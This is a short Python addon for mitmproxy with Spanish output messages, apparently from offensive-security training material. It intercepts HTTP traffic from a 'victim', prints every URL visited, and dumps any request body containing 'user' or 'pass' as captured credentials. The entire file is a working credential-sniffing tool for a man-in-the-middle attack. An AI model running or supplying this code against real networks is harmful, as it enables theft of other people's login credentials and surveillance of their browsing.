#!/usr/bin/env python3
from mitmproxy import http
from mitmproxy import ctx
from urllib.parse import urlparse

def has_keywords(data, keywords):
    return any(keyword in data for keyword in keywords)

def request(packet):
    #ctx.log.info(f"[+] URL: {packet.request.url}")
    url = packet.request.url
    url_parsed = urlparse(url)
    scheme = url_parsed.scheme
    domain = url_parsed.netloc
    path = url_parsed.path

    print(f"[+] URL visitada por la víctima: {scheme}.//{domain}{path}")

    keywords = ["user", "pass"]
    data = packet.request.get_text()

    if has_keywords(data, keywords):
        print(f"\[+] Posibles credenciales capturadas:\n{data}\n")